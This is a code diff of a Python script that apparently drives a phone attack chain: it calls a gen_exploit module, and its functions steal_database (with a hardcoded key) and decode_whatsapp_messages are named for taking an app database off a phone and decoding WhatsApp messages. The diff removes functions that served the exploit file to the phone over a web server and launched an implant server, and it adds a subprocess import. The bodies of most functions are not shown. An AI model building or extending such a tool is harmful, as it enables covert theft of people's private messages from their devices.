@@ -1,4 +1,4 @@
-import http.server, socket, sqlite3, json, requests, datetime, os, time
+import http.server, socket, sqlite3, json, requests, datetime, os, time, subprocess
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from Crypto.Cipher import AES
 import gen_exploit
@@ -6,16 +6,10 @@ import os
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
-def listen_for_phone_and_send_exploit_file():
-    print("Starting web server on port 80")
-    os.system("sudo python3 -m http.server 80")
-    
+
 def prepare_implant():
     pass
 
-def start_implant_server():
-    os.system("python3 implant-server.py")
-    print("Implant server started on port 8080")
 
 def steal_database():
     key = "546869732069732061206b6579313233"
@@ -69,11 +63,6 @@ def connect_to_db(filepath):
 
 if __name__ == "__main__":
     gen_exploit.gen_exploit()
-    time.sleep(10)
-    start_implant_server()
-    time.sleep(10)
-    listen_for_phone_and_send_exploit_file()
-    time.sleep(10)
     steal_database()
     time.sleep(10)
     decode_whatsapp_messages()
